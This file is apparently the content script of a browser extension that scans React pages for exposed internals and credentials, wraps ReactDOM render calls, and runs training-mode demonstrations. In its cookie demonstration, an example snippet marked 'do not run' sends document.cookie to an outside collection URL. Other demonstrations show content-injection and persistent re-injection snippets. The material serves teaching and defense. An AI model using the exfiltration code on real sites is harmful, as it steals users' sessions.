/**
 * React Security Suite - Content Script
 * 
 * This script runs in the context of web pages and is responsible for:
 * - Detecting React on the page
 * - Scanning for vulnerabilities
 * - Applying protection measures
 * - Running educational demonstrations in training mode
 */

// Extension state
let extensionState = {
  mode: 'defense',
  protectionActive: false,
  trainingActive: false,
  autoDemoActive: false,
  reactDetected: false,
  reactVersion: null,
  demonstrations: {
    active: false,
    type: null,
    cleanupFunctions: []
  }
};

// Demo types available for auto-demo
const DEMO_TYPES = ['reactInternals', 'domManipulation', 'cookieAccess', 'persistentHook'];

// Constants
const TRAINING_BANNER_ID = 'react-security-suite-training-banner';
const TRAINING_BANNER_STYLE = `
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  background-color: #ff5722;
  color: white;
  text-align: center;
  padding: 8px;
  font-family: Arial, sans-serif;
  font-weight: bold;
  z-index: 2147483647;
  border-bottom: 2px solid #d84315;
`;

// Initialize and detect React
function initialize() {
  detectReact();
  
  // Listen for messages from the background script
  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === 'scan') {
      scanForVulnerabilities().then(vulnerabilities => {
        sendResponse({ success: true, vulnerabilities });
      });
      return true; // Required for async response
    }
    
    if (message.action === 'applyProtection') {
      const result = applyProtection();
      sendResponse({ success: true, protected: result });
      return true;
    }
    
    if (message.action === 'checkProtection') {
      sendResponse({ success: true, protected: extensionState.protectionActive });
      return true;
    }
    
    if (message.action === 'runDemonstration') {
      if (!extensionState.trainingActive) {
        sendResponse({ 
          success: false, 
          error: 'Training mode must be active to run demonstrations' 
        });
        return true;
      }
      
      const result = runDemonstration(message.attackType, message.options);
      sendResponse({ success: result.success, error: result.error });
      return true;
    }
    
    if (message.action === 'stopDemonstration') {
      stopDemonstration();
      sendResponse({ success: true });
      return true;
    }
    
    if (message.action === 'setMode') {
      setMode(message.mode);
      sendResponse({ success: true, mode: extensionState.mode });
      
      // If training mode is activated and auto-demo is enabled, run the demos
      if (message.mode === 'training' && extensionState.autoDemoActive) {
        runAllDemos();
      }
      
      return true;
    }
    
    if (message.action === 'setAutoDemo') {
      extensionState.autoDemoActive = message.autoDemo;
      
      // If auto-demo is enabled and we're in training mode, run the demos
      if (extensionState.autoDemoActive && extensionState.trainingActive) {
        runAllDemos();
      }
      
      sendResponse({ success: true, autoDemo: extensionState.autoDemoActive });
      return true;
    }
  });
  
  // Run initial scan
  setTimeout(() => {
    scanForVulnerabilities().then(vulnerabilities => {
      chrome.runtime.sendMessage({
        action: 'scanComplete',
        vulnerabilities
      });
    });
  }, 1000);
}

// Detect React and its version
function detectReact() {
  // Check for React in various ways
  const hasReact = !!(
    window.React || 
    window.__REACT_DEVTOOLS_GLOBAL_HOOK__ ||
    document.querySelector('[data-reactroot]') ||
    document.querySelector('[data-reactid]')
  );
  
  if (!hasReact) {
    return false;
  }
  
  extensionState.reactDetected = true;
  
  // Try to determine React version
  let version = 'unknown';
  
  if (window.React && window.React.version) {
    version = window.React.version;
  } else if (document.querySelector('[data-reactroot]')) {
    version = '16+';
  } else if (document.querySelector('[data-reactid]')) {
    version = '15 or earlier';
  }
  
  extensionState.reactVersion = version;
  
  // Report to background script
  chrome.runtime.sendMessage({
    action: 'reactDetected',
    version: version
  });
  
  return true;
}

// Scan for React vulnerabilities
async function scanForVulnerabilities() {
  const vulnerabilities = [];
  
  // Only scan if React is detected
  if (!extensionState.reactDetected) {
    return vulnerabilities;
  }
  
  // Check for exposed React internals
  if (window.React && window.React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED) {
    vulnerabilities.push({
      type: 'EXPOSED_REACT_INTERNALS',
      severity: 'HIGH',
      description: 'React internals are exposed, allowing potential DOM manipulation attacks',
      location: window.location.href,
      details: 'The React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED object is accessible'
    });
  }
  
  // Check for exposed ReactDOM internals
  if (window.ReactDOM && window.ReactDOM.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED) {
    vulnerabilities.push({
      type: 'EXPOSED_REACTDOM_INTERNALS',
      severity: 'HIGH',
      description: 'ReactDOM internals are exposed, allowing potential DOM manipulation attacks',
      location: window.location.href,
      details: 'The ReactDOM.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED object is accessible'
    });
  }
  
  // Check for unprotected render methods
  if (window.ReactDOM && window.ReactDOM.render && !window.ReactDOM.render.isProtected) {
    vulnerabilities.push({
      type: 'UNPROTECTED_RENDER',
      severity: 'MEDIUM',
      description: 'ReactDOM.render is accessible to potential attackers',
      location: window.location.href,
      details: 'The ReactDOM.render method can be used to inject content'
    });
  }
  
  // Check for unprotected createRoot (React 18+)
  if (window.ReactDOM && window.ReactDOM.createRoot && !window.ReactDOM.createRoot.isProtected) {
    vulnerabilities.push({
      type: 'UNPROTECTED_CREATE_ROOT',
      severity: 'MEDIUM',
      description: 'ReactDOM.createRoot is accessible to potential attackers',
      location: window.location.href,
      details: 'The ReactDOM.createRoot method can be used to inject content in React 18+'
    });
  }
  
  // Check for dangerouslySetInnerHTML usage
  const elements = document.querySelectorAll('*');
  for (const el of elements) {
    const reactProps = el._reactProps || el.__reactProps$;
    if (reactProps && reactProps.dangerouslySetInnerHTML) {
      vulnerabilities.push({
        type: 'DANGEROUS_INNERHTML',
        severity: 'MEDIUM',
        description: 'dangerouslySetInnerHTML found in React components',
        location: el.outerHTML.substring(0, 100) + '...',
        details: 'This can lead to XSS vulnerabilities if user input is not properly sanitized'
      });
      break; // Only report once
    }
  }
  
  // Check for exposed tokens in script tags
  const scripts = document.querySelectorAll('script');
  for (const script of scripts) {
    const content = script.textContent;
    if (!content) continue;
    
    // Look for potential API keys, tokens or secrets
    const tokenRegex = /(api|token|key|secret|password|credential)([A-Za-z0-9_-]+)?\s*[:=]\s*["']([^"']{8,})["']/gi;
    const matches = content.match(tokenRegex);
    
    if (matches) {
      vulnerabilities.push({
        type: 'EXPOSED_CREDENTIALS',
        severity: 'CRITICAL',
        description: `Potential credentials found in script tag: ${matches.length} matches`,
        location: script.outerHTML.substring(0, 100) + '...',
        details: 'Sensitive information should not be included directly in client-side code'
      });
      break; // Only report once
    }
  }
  
  return vulnerabilities;
}

// Apply protection measures
function applyProtection() {
  if (extensionState.protectionActive) {
    return true; // Already protected
  }
  
  if (!extensionState.reactDetected) {
    return false; // No React to protect
  }
  
  // Store original methods if they exist
  const originalMethods = {
    render: window.ReactDOM?.render,
    createRoot: window.ReactDOM?.createRoot,
    hydrateRoot: window.ReactDOM?.hydrateRoot,
    findDOMNode: window.ReactDOM?.findDOMNode
  };
  
  // Protect ReactDOM.render
  if (window.ReactDOM && window.ReactDOM.render) {
    window.ReactDOM.render = function(...args) {
      console.warn('[React Security Suite] ReactDOM.render intercepted');
      
      // Check if the call is legitimate
      const callStack = new Error().stack;
      const isLegitimate = isLegitimateCall(callStack);
      
      // Only allow if legitimate
      if (isLegitimate) {
        return originalMethods.render.apply(this, args);
      } else {
        console.error('[React Security Suite] Blocked suspicious ReactDOM.render call');
        // Send alert to extension
        chrome.runtime.sendMessage({
          action: 'attackAttempt',
          details: {
            method: 'render',
            args: JSON.stringify(args[0]),
            stack: callStack
          }
        });
        return null;
      }
    };
    window.ReactDOM.render.isProtected = true;
  }
  
  // Protect ReactDOM.createRoot (React 18+)
  if (window.ReactDOM && window.ReactDOM.createRoot) {
    window.ReactDOM.createRoot = function(...args) {
      console.warn('[React Security Suite] ReactDOM.createRoot intercepted');
      
      const callStack = new Error().stack;
      const isLegitimate = isLegitimateCall(callStack);
      
      if (isLegitimate) {
        const root = originalMethods.createRoot.apply(this, args);
        
        // Also protect the root.render method
        const originalRootRender = root.render;
        root.render = function(...renderArgs) {
          console.warn('[React Security Suite] root.render intercepted');
          return originalRootRender.apply(this, renderArgs);
        };
        
        return root;
      } else {
        console.error('[React Security Suite] Blocked suspicious ReactDOM.createRoot call');
        chrome.runtime.sendMessage({
          action: 'attackAttempt',
          details: {
            method: 'createRoot',
            args: JSON.stringify(args[0]),
            stack: callStack
          }
        });
        return {
          render: function() { return null; }
        };
      }
    };
    window.ReactDOM.createRoot.isProtected = true;
  }
  
  // Remove React internals if exposed
  if (window.React && window.React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED) {
    delete window.React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED;
    console.warn('[React Security Suite] Removed exposed React internals');
  }
  
  // Remove ReactDOM internals if exposed
  if (window.ReactDOM && window.ReactDOM.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED) {
    delete window.ReactDOM.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED;
    console.warn('[React Security Suite] Removed exposed ReactDOM internals');
  }
  
  extensionState.protectionActive = true;
  
  // Report to background script
  chrome.runtime.sendMessage({
    action: 'protectionStatus',
    active: true
  });
  
  return true;
}

// Helper to determine if call is legitimate
function isLegitimateCall(callStack) {
  // This is a simple heuristic - in reality this would be more sophisticated
  // For demo purposes, we're checking if the call originated from browser extensions
  // or from event handlers which might indicate malicious injection
  
  const suspiciousPatterns = [
    'chrome-extension://',
    'moz-extension://',
    'eval',
    'Function',
    'injected',
    'inject.js'
  ];
  
  // Exclude our own extension
  const ownExtensionId = chrome.runtime.id;
  const ownExtensionPattern = `chrome-extension://${ownExtensionId}`;
  
  // True = legitimate, False = suspicious
  return !suspiciousPatterns.some(pattern => 
    callStack.includes(pattern) && !callStack.includes(ownExtensionPattern)
  );
}

// Set extension mode (defense or training)
function setMode(mode) {
  if (mode !== 'defense' && mode !== 'training') {
    return false;
  }
  
  extensionState.mode = mode;
  extensionState.trainingActive = (mode === 'training');
  
  // If switching to training mode, show warning banner
  if (mode === 'training') {
    showTrainingBanner();
    
    // Add the global training mode flag that demos check for
    window.__reactSecuritySuiteTrainingMode = true;
  } else {
    hideTrainingBanner();
    stopDemonstration(); // Stop any active demonstrations
    
    // Remove the global training mode flag
    window.__reactSecuritySuiteTrainingMode = false;
  }
  
  return true;
}

// Run all demonstrations in sequence
async function runAllDemos() {
  // Don't run if not in training mode
  if (!extensionState.trainingActive || !extensionState.autoDemoActive) {
    return;
  }
  
  // Don't run if demonstrations are already active
  if (extensionState.demonstrations.active) {
    stopDemonstration();
    // Wait for cleanup to complete
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  console.log('[React Security Suite] Running all demonstrations in sequence');
  
  try {
    // Run each demo type with a delay between them
    for (const demoType of DEMO_TYPES) {
      if (!extensionState.autoDemoActive) break; // Stop if auto-demo was disabled
      
      console.log(`[React Security Suite] Running demonstration: ${demoType}`);
      
      // Run the demonstration
      const result = runDemonstration(demoType);
      
      if (!result.success) {
        console.error(`[React Security Suite] Failed to run demonstration: ${demoType}`, result.error);
        continue;
      }
      
      // Wait for demonstration to run (10 seconds)
      await new Promise(resolve => setTimeout(resolve, 10000));
      
      // Stop the demonstration
      stopDemonstration();
      
      // Wait between demonstrations (2 seconds)
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
    
    console.log('[React Security Suite] Completed all demonstrations');
  } catch (error) {
    console.error('[React Security Suite] Error in demo sequence:', error);
    // Make sure we clean up if there's an error
    stopDemonstration();
  }
}

// Show training mode banner
function showTrainingBanner() {
  if (document.getElementById(TRAINING_BANNER_ID)) {
    return; // Banner already exists
  }
  
  const banner = document.createElement('div');
  banner.id = TRAINING_BANNER_ID;
  banner.style.cssText = TRAINING_BANNER_STYLE;
  banner.textContent = '⚠️ REACT SECURITY TRAINING MODE ACTIVE - FOR EDUCATIONAL PURPOSES ONLY ⚠️';
  
  document.body.prepend(banner);
}

// Hide training mode banner
function hideTrainingBanner() {
  const banner = document.getElementById(TRAINING_BANNER_ID);
  if (banner) {
    banner.remove();
  }
}

// Run security demonstration (training mode only)
function runDemonstration(attackType, options = {}) {
  if (!extensionState.trainingActive) {
    return { 
      success: false, 
      error: 'Training mode must be active to run demonstrations' 
    };
  }
  
  // Stop any existing demonstration
  stopDemonstration();
  
  extensionState.demonstrations.active = true;
  extensionState.demonstrations.type = attackType;
  
  // Show training banner if not already visible
  showTrainingBanner();
  
  let result = { success: false, error: 'Unknown demonstration type' };
  
  switch (attackType) {
    case 'reactInternals':
      result = demonstrateReactInternals();
      break;
    case 'domManipulation':
      result = demonstrateDomManipulation();
      break;
    case 'cookieAccess':
      result = demonstrateCookieAccess();
      break;
    case 'persistentHook':
      result = demonstratePersistentHook();
      break;
    default:
      return result;
  }
  
  return result;
}

// Stop active demonstration
function stopDemonstration() {
  if (!extensionState.demonstrations.active) {
    return true;
  }
  
  // Run all cleanup functions
  extensionState.demonstrations.cleanupFunctions.forEach(cleanup => {
    try {
      cleanup();
    } catch (e) {
      console.error('[React Security Suite] Error during demonstration cleanup:', e);
    }
  });
  
  extensionState.demonstrations.active = false;
  extensionState.demonstrations.type = null;
  extensionState.demonstrations.cleanupFunctions = [];
  
  return true;
}

// DEMONSTRATION: React Internals Access
function demonstrateReactInternals() {
  if (!extensionState.reactDetected) {
    return { 
      success: false, 
      error: 'React not detected on this page' 
    };
  }
  
  // Create demonstration container
  const container = document.createElement('div');
  container.id = 'react-security-demo-container';
  container.style.cssText = `
    position: fixed;
    top: 40px;
    left: 20px;
    right: 20px;
    background-color: rgba(0, 0, 0, 0.8);
    color: #00ff00;
    font-family: monospace;
    padding: 20px;
    border-radius: 5px;
    z-index: 2147483646;
    max-height: 80vh;
    overflow: auto;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  
  let demoContent = '<h2>React Internals Access Demonstration</h2>';
  demoContent += '<p>This demonstrates how malicious code could access React internals.</p>';
  demoContent += '<h3>Detected React Information:</h3>';
  
  // Collect React information
  const reactInfo = {
    version: extensionState.reactVersion,
    hasReactDOM: !!window.ReactDOM,
    hasInternals: !!(window.React && window.React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED),
    hasFiber: !!(window.React && window.React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED && 
                window.React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner),
    rootElements: document.querySelectorAll('[data-reactroot]').length,
    possibleComponents: []
  };
  
  // Try to find React components
  const allElements = document.querySelectorAll('*');
  for (const el of allElements) {
    // Check for React instance
    const hasReactInstance = !!(
      el._reactRootContainer ||
      el._reactInternalInstance ||
      el._reactInternals ||
      el.__reactFiber$ ||
      el.__reactInternalInstance$
    );
    
    if (hasReactInstance) {
      reactInfo.possibleComponents.push({
        tagName: el.tagName,
        id: el.id,
        className: el.className
      });
      
      // Limit to 5 components for demo
      if (reactInfo.possibleComponents.length >= 5) {
        break;
      }
    }
  }
  
  // Display React information
  demoContent += `<pre>${JSON.stringify(reactInfo, null, 2)}</pre>`;
  
  // Show how this could be exploited
  demoContent += '<h3>Potential Exploitation:</h3>';
  demoContent += `<p>A malicious script could use this information to:</p>
    <ul>
      <li>Access internal React state</li>
      <li>Modify component behavior</li>
      <li>Inject content into the React component tree</li>
      <li>Monitor React rendering lifecycle</li>
    </ul>`;
  
  container.innerHTML = demoContent;
  document.body.appendChild(container);
  
  // Add cleanup function
  extensionState.demonstrations.cleanupFunctions.push(() => {
    container.remove();
  });
  
  return { success: true };
}

// DEMONSTRATION: DOM Manipulation
function demonstrateDomManipulation() {
  if (!extensionState.reactDetected) {
    return { 
      success: false, 
      error: 'React not detected on this page' 
    };
  }
  
  // Create demonstration container
  const container = document.createElement('div');
  container.id = 'react-security-demo-container';
  container.style.cssText = `
    position: fixed;
    top: 40px;
    left: 20px;
    right: 20px;
    background-color: rgba(0, 0, 0, 0.8);
    color: #00ff00;
    font-family: monospace;
    padding: 20px;
    border-radius: 5px;
    z-index: 2147483646;
    max-height: 80vh;
    overflow: auto;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  
  let demoContent = '<h2>DOM Manipulation Demonstration</h2>';
  demoContent += '<p>This demonstrates how malicious code could manipulate the DOM using React.</p>';
  
  // Find a suitable target for demonstration
  const reactRoot = document.querySelector('[data-reactroot]') || document.getElementById('root');
  let targetFound = false;
  
  if (reactRoot) {
    targetFound = true;
    
    demoContent += '<h3>Target Found:</h3>';
    demoContent += `<p>React root element: ${reactRoot.tagName} (id: ${reactRoot.id || 'none'})</p>`;
    
    // Create a demonstration element
    const demoElement = document.createElement('div');
    demoElement.id = 'react-security-demo-injection';
    demoElement.style.cssText = `
      background-color: #ff0000;
      color: white;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      font-family: Arial, sans-serif;
      text-align: center;
    `;
    demoElement.innerHTML = '<strong>⚠️ SIMULATED MALICIOUS CONTENT INJECTION ⚠️</strong><br>This content was injected for demonstration purposes only.';
    
    // Show the demonstration element
    demoContent += '<h3>Simulated Injection:</h3>';
    demoContent += '<p>The following content would be injected into the React application:</p>';
    demoContent += demoElement.outerHTML;
    
    // Explain the attack
    demoContent += '<h3>How This Attack Works:</h3>';
    demoContent += `<p>A malicious script could:</p>
      <ol>
        <li>Access the React DOM API</li>
        <li>Create a new element with malicious content</li>
        <li>Render it into the application using ReactDOM.render or createRoot</li>
        <li>This could be used to display fake login forms, misleading messages, or other malicious content</li>
      </ol>`;
    
    // Show code example (for educational purposes)
    demoContent += '<h3>Example Attack Code:</h3>';
    demoContent += `<pre>
// Malicious code example (DO NOT RUN)
const maliciousElement = React.createElement('div', {
  style: {
    backgroundColor: 'red',
    color: 'white',
    padding: '10px',
    margin: '10px 0',
    borderRadius: '5px',
    fontFamily: 'Arial, sans-serif',
    textAlign: 'center'
  }
}, [
  React.createElement('strong', {}, '⚠️ MALICIOUS CONTENT ⚠️'),
  React.createElement('br'),
  'This could be a fake login form or other harmful content'
]);

// Inject using ReactDOM
if (ReactDOM.createRoot) {
  const root = ReactDOM.createRoot(document.getElementById('root'));
  root.render(maliciousElement);
} else if (ReactDOM.render) {
  ReactDOM.render(maliciousElement, document.getElementById('root'));
}
</pre>`;
  } else {
    demoContent += '<h3>No React Root Found</h3>';
    demoContent += '<p>Could not find a React root element to demonstrate the attack.</p>';
  }
  
  container.innerHTML = demoContent;
  document.body.appendChild(container);
  
  // Add cleanup function
  extensionState.demonstrations.cleanupFunctions.push(() => {
    container.remove();
  });
  
  return { success: true };
}

// DEMONSTRATION: Cookie Access
function demonstrateCookieAccess() {
  // Create demonstration container
  const container = document.createElement('div');
  container.id = 'react-security-demo-container';
  container.style.cssText = `
    position: fixed;
    top: 40px;
    left: 20px;
    right: 20px;
    background-color: rgba(0, 0, 0, 0.8);
    color: #00ff00;
    font-family: monospace;
    padding: 20px;
    border-radius: 5px;
    z-index: 2147483646;
    max-height: 80vh;
    overflow: auto;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  
  let demoContent = '<h2>Cookie Access Demonstration</h2>';
  demoContent += '<p>This demonstrates how malicious code could access cookies.</p>';
  
  // Get cookies (but mask values for security)
  const cookies = document.cookie.split(';').map(cookie => {
    const parts = cookie.trim().split('=');
    const name = parts[0];
    // Mask the actual value
    const value = parts.slice(1).join('=');
    const maskedValue = value.replace(/./g, '*');
    return { name, maskedValue, length: value.length };
  });
  
  demoContent += '<h3>Cookies Found:</h3>';
  
  if (cookies.length > 0) {
    demoContent += '<ul>';
    cookies.forEach(cookie => {
      demoContent += `<li><strong>${cookie.name}</strong>: ${cookie.maskedValue} (${cookie.length} characters)</li>`;
    });
    demoContent += '</ul>';
  } else {
    demoContent += '<p>No cookies found on this page.</p>';
  }
  
  // Explain the attack
  demoContent += '<h3>How This Attack Works:</h3>';
  demoContent += `<p>A malicious script could:</p>
    <ol>
      <li>Access document.cookie to read all non-HttpOnly cookies</li>
      <li>Send this data to a remote server using fetch or XMLHttpRequest</li>
      <li>Use the stolen cookies to impersonate the user</li>
    </ol>`;
  
  // Show code example (for educational purposes)
  demoContent += '<h3>Example Attack Code:</h3>';
  demoContent += `<pre>
// Malicious code example (DO NOT RUN)
const stolenCookies = document.cookie;

// Send to attacker's server
fetch('https://attck-deploy.net/attcks/T1119/collect', {
  method: 'POST',
  body: JSON.stringify({ cookies: stolenCookies }),
  headers: { 'Content-Type': 'application/json' }
});
</pre>`;

  demoContent += '<h3>Protection Measures:</h3>';
  demoContent += `<ul>
    <li>Use HttpOnly flag for sensitive cookies</li>
    <li>Implement proper Content Security Policy (CSP)</li>
    <li>Use SameSite cookie attribute</li>
    <li>Implement token-based authentication with short-lived tokens</li>
  </ul>`;
  
  container.innerHTML = demoContent;
  document.body.appendChild(container);
  
  // Add cleanup function
  extensionState.demonstrations.cleanupFunctions.push(() => {
    container.remove();
  });
  
  return { success: true };
}

// DEMONSTRATION: Persistent Hook
function demonstratePersistentHook() {
  if (!extensionState.reactDetected) {
    return { 
      success: false, 
      error: 'React not detected on this page' 
    };
  }
  
  // Create demonstration container
  const container = document.createElement('div');
  container.id = 'react-security-demo-container';
  container.style.cssText = `
    position: fixed;
    top: 40px;
    left: 20px;
    right: 20px;
    background-color: rgba(0, 0, 0, 0.8);
    color: #00ff00;
    font-family: monospace;
    padding: 20px;
    border-radius: 5px;
    z-index: 2147483646;
    max-height: 80vh;
    overflow: auto;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  
  let demoContent = '<h2>Persistent Hook Demonstration</h2>';
  demoContent += '<p>This demonstrates how malicious code could create persistent hooks in React.</p>';
  
  // Create a counter to simulate persistence
  let hookCounter = 0;
  
  // Create a demonstration element to show the hook in action
  const hookIndicator = document.createElement('div');
  hookIndicator.id = 'react-security-hook-indicator';
  hookIndicator.style.cssText = `
    position: fixed;
    bottom: 20px;
    right: 20px;
    background-color: #ff0000;
    color: white;
    padding: 10px;
    border-radius: 5px;
    font-family: Arial, sans-serif;
    z-index: 2147483645;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  hookIndicator.innerHTML = '<strong>Persistent Hook Demo:</strong> Hook executed 0 times';
  
  // Set up the interval to simulate a persistent hook
  const hookInterval = setInterval(() => {
    hookCounter++;
    hookIndicator.innerHTML = `<strong>Persistent Hook Demo:</strong> Hook executed ${hookCounter} times`;
  }, 2000);
  
  // Explain the attack
  demoContent += '<h3>How This Attack Works:</h3>';
  demoContent += `<p>A malicious script could:</p>
    <ol>
      <li>Set up intervals or observers to detect React re-renders</li>
      <li>Re-inject malicious code whenever the application updates</li>
      <li>Maintain persistence even if the initial injection is removed</li>
      <li>Monitor user interactions and application state changes</li>
    </ol>`;
  
  // Show code example (for educational purposes)
  demoContent += '<h3>Example Attack Code:</h3>';
  demoContent += `<pre>
// Malicious code example (DO NOT RUN)
const hookInterval = 2000; // Reinjection interval in ms

const inject = () => {
  const container = document.getElementById('root');
  const react = window.React;
  const reactDom = window.ReactDOM;

  if (!container || !react || !reactDom) return;

  // Malicious actions here...
  console.log('Malicious hook executed');
  
  // Could exfiltrate data
  // Could inject content
  // Could monitor user activity
};

// Initial injection
inject();

// Persistent hook
setInterval(inject, hookInterval);
</pre>`;

  demoContent += '<h3>Protection Measures:</h3>';
  demoContent += `<ul>
    <li>Monitor for suspicious intervals and timers</li>
    <li>Use Content Security Policy (CSP) to restrict script execution</li>
    <li>Implement subresource integrity checks</li>
    <li>Use React's built-in security features and keep it updated</li>
  </ul>`;
  
  container.innerHTML = demoContent;
  document.body.appendChild(container);
  document.body.appendChild(hookIndicator);
  
  // Add cleanup functions
  extensionState.demonstrations.cleanupFunctions.push(() => {
    container.remove();
    hookIndicator.remove();
    clearInterval(hookInterval);
  });
  
  return { success: true };
}

// Initialize the extension when the content script loads
initialize();
